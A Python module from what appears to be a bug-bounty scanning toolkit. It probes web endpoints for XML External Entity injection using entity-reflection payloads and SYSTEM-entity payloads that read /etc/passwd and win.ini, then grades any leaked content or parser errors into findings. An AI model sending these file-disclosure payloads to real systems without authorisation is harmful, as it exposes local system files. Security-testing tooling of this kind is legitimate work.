#!/usr/bin/env python3
"""
xxe.py — XML External Entity injection detection (P2)
=====================================================
Sends XML bodies carrying (a) an internal entity that is reflected in the
response, and (b) an external SYSTEM entity referencing a local file. A
reflected entity value or leaked local-file content confirms XXE. A parser
error signature (not well-formed / DTD) on a malformed DOCTYPE is a weaker
signal. Only POST/body endpoints are probed (XML body injection).

Pure checkers are unit-testable; only ``test_endpoint``/``run_xxe`` do I/O.
"""
from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass
from typing import Any

try:
    from toolkit.infra.finding import NormalizedFinding
    _HAVE_FINDING = True
except Exception:  # pragma: no cover
    _HAVE_FINDING = False


_MARKER = "BBTKXXE9f3c"
_LFI_SIG = "root:x:0:0:"

# (label, xml_body)
_PAYLOADS = [
    ("internal-entity-reflection",
     f"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe \"{_MARKER}\">]>"
     f"<r>&xxe;</r>"),
    ("external-file-disclosure",
     "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "
     "\"file:///etc/passwd\">]><r>&xxe;</r>"),
    ("external-file-disclosure-win",
     "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "
     "\"file:///c:/windows/win.ini\">]><r>&xxe;</r>"),
]

_ERR_SIGS = ["not well-formed", "xml declaration", "entity", "dtd",
             "saxparse", "libxml", "premature end", "mismatched tag",
             "reference to external entity"]


def _detect_reflection(text: str) -> str:
    if _MARKER in (text or ""):
        return "internal-entity-reflection"
    if _LFI_SIG in (text or ""):
        return "external-file-disclosure"
    return ""


def _detect_parse_error(text: str) -> bool:
    low = (text or "").lower()
    return any(s in low for s in _ERR_SIGS)


@dataclass
class XxeFinding:
    url: str
    method: str
    technique: str
    payload_label: str
    evidence: str = ""

    def to_dict(self) -> dict:
        return self.__dict__.copy()


async def _send_xml(client, endpoint: Any, body: str, *,
                    timeout: float = 10.0) -> tuple[int, str]:
    headers = {"User-Agent": "Mozilla/5.0 (compatible; BBTK-xxe/1.0)",
               "Content-Type": "application/xml"}
    try:
        r = await client.request(endpoint.method, endpoint.url, headers=headers,
                                 content=body, timeout=timeout)
        return int(getattr(r, "status_code", 0) or 0), getattr(r, "text", "") or ""
    except Exception:
        return 0, ""


async def test_endpoint(endpoint: Any, client: object, *,
                        timeout: float = 10.0) -> list[XxeFinding]:
    if getattr(endpoint, "method", "GET").upper() == "GET":
        return []  # XXE is a body-based injection
    out: list[XxeFinding] = []
    seen: set[str] = set()
    for label, body in _PAYLOADS:
        status, resp = await _send_xml(client, endpoint, body, timeout=timeout)
        if status and _detect_reflection(resp):
            if label not in seen:
                seen.add(label)
                out.append(XxeFinding(endpoint.url, endpoint.method,
                                      "reflection", label,
                                      f"XML entity expanded in response"))
            continue
        if status and _detect_parse_error(resp):
            if "error" not in seen:
                seen.add("error")
                out.append(XxeFinding(endpoint.url, endpoint.method,
                                      "parse-error", label,
                                      "XML parser error signature in response"))
    return out


async def run_xxe(endpoints: list[Any], client: object, *,
                 timeout: float = 10.0, concurrency: int = 10) -> list[XxeFinding]:
    sem = asyncio.Semaphore(concurrency)

    async def guarded(ep):
        async with sem:
            return await test_endpoint(ep, client, timeout=timeout)
    results = await asyncio.gather(*[guarded(ep) for ep in endpoints])
    return [f for sub in results for f in sub]


def to_normalized_findings(findings: list[XxeFinding],
                           source_tool: str = "xxe.py") -> list[dict]:
    out: list[dict] = []
    for f in findings:
        sev = "HIGH" if f.technique == "reflection" else "LOW"
        detail = (f"XML External Entity injection ({f.technique}) on "
                  f"{f.method} {f.url} via payload '{f.payload_label}'")
        if _HAVE_FINDING:
            nf = NormalizedFinding(source_tool=source_tool, host=_host(f.url), url=f.url,
                                   vuln_class_key="XXE", severity=sev,
                                   title=f"XXE in {f.method} {f.url}",
                                   detail=detail, evidence=f.evidence,
                                   confidence="confirmed" if f.technique == "reflection" else "probable")
            d = nf.to_dict()
            d["param"] = ""
        else:
            d = {"source_tool": source_tool, "host": _host(f.url), "url": f.url,
                 "param": "", "vuln_class_key": "XXE", "severity": sev,
                 "title": f"XXE in {f.method} {f.url}", "detail": detail,
                 "evidence": f.evidence,
                 "confidence": "confirmed" if f.technique == "reflection" else "probable"}
        out.append(d)
    return out


def _host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).netloc
